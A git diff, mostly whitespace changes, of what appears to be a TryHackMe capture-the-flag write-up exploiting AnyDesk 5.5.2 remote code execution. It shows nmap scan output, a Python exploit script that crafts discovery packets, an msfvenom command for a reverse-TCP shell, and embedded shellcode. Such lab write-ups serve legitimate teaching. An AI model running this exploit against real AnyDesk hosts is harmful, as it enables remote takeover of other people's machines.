@@ -4,21 +4,21 @@
 
 | PORT | SERVICE |
 | :--- | :------ |
-| 22   | SSH     |
-| 7070 | SSL     |
+| 22 | SSH |
+| 7070 | SSL |
 
 ```
-PORT     STATE SERVICE         VERSION
-22/tcp   open  ssh             OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey:
-|   2048 72:d7:25:34:e8:07:b7:d9:6f:ba:d6:98:1a:a3:17:db (RSA)
-|   256 72:10:26:ce:5c:53:08:4b:61:83:f8:7a:d1:9e:9b:86 (ECDSA)
-|_  256 d1:0e:6d:a8:4e:8e:20:ce:1f:00:32:c1:44:8d:fe:4e (ED25519)
-7070/tcp open  ssl/realserver?
+| 2048 72:d7:25:34:e8:07:b7:d9:6f:ba:d6:98:1a:a3:17:db (RSA)
+| 256 72:10:26:ce:5c:53:08:4b:61:83:f8:7a:d1:9e:9b:86 (ECDSA)
+|_ 256 d1:0e:6d:a8:4e:8e:20:ce:1f:00:32:c1:44:8d:fe:4e (ED25519)
+7070/tcp open ssl/realserver?
 |_ssl-date: TLS randomness does not represent time
 | ssl-cert: Subject: commonName=AnyDesk Client
 | Not valid before: 2022-03-23T20:04:30
-|_Not valid after:  2072-03-10T20:04:30
+|_Not valid after: 2072-03-10T20:04:30
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
@@ -75,21 +75,21 @@ ip = '192.168.x.x'
 port = 50001
 
 def gen_discover_packet(ad_id, os, hn, user, inf, func):
-  d  = chr(0x3e)+chr(0xd1)+chr(0x1)
-  d += struct.pack('>I', ad_id)
-  d += struct.pack('>I', 0)
-  d += chr(0x2)+chr(os)
-  d += struct.pack('>I', len(hn)) + hn
-  d += struct.pack('>I', len(user)) + user
-  d += struct.pack('>I', 0)
-  d += struct.pack('>I', len(inf)) + inf
-  d += chr(0)
-  d += struct.pack('>I', len(func)) + func
-  d += chr(0x2)+chr(0xc3)+chr(0x51)
-  return d
+ d = chr(0x3e)+chr(0xd1)+chr(0x1)
+ d += struct.pack('>I', ad_id)
+ d += struct.pack('>I', 0)
+ d += chr(0x2)+chr(os)
+ d += struct.pack('>I', len(hn)) + hn
+ d += struct.pack('>I', len(user)) + user
+ d += struct.pack('>I', 0)
+ d += struct.pack('>I', len(inf)) + inf
+ d += chr(0)
+ d += struct.pack('>I', len(func)) + func
+ d += chr(0x2)+chr(0xc3)+chr(0x51)
+ return d
 
 # msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.y.y LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
-shellcode =  b""
+shellcode = b""
 shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
 shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\xcb\x46\x40"
 shellcode += b"\x6c\xed\xa4\xe0\xfb\x48\x31\x58\x27\x48\x2d"
@@ -116,7 +116,7 @@ We need to craft our own shellcode, let's use `msfvenom` for it:
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
 ```
 
-Once we get our shellcode, we need to replace it on the script, we also need to change the `IP`  to match the THM machine's IP, final script should look similar to this one:
+Once we get our shellcode, we need to replace it on the script, we also need to change the `IP` to match the THM machine's IP, final script should look similar to this one:
 
 ```python
 # Exploit Title: AnyDesk 5.5.2 - Remote Code Execution
@@ -136,21 +136,21 @@ ip = '10.10.90.151'
 port = 50001
 
 def gen_discover_packet(ad_id, os, hn, user, inf, func):
-  d  = chr(0x3e)+chr(0xd1)+chr(0x1)
-  d += struct.pack('>I', ad_id)
-  d += struct.pack('>I', 0)
-  d += chr(0x2)+chr(os)
-  d += struct.pack('>I', len(hn)) + hn
-  d += struct.pack('>I', len(user)) + user
-  d += struct.pack('>I', 0)
-  d += struct.pack('>I', len(inf)) + inf
-  d += chr(0)
-  d += struct.pack('>I', len(func)) + func
-  d += chr(0x2)+chr(0xc3)+chr(0x51)
-  return d
+ d = chr(0x3e)+chr(0xd1)+chr(0x1)
+ d += struct.pack('>I', ad_id)
+ d += struct.pack('>I', 0)
+ d += chr(0x2)+chr(os)
+ d += struct.pack('>I', len(hn)) + hn
+ d += struct.pack('>I', len(user)) + user
+ d += struct.pack('>I', 0)
+ d += struct.pack('>I', len(inf)) + inf
+ d += chr(0)
+ d += struct.pack('>I', len(func)) + func
+ d += chr(0x2)+chr(0xc3)+chr(0x51)
+ return d
 
 # msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.y.y LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
-shellcode =  b""
+shellcode = b""
 shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
 shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\x87\x2a\x88"
 shellcode += b"\xed\x17\xae\x2b\x46\x48\x31\x58\x27\x48\x2d"
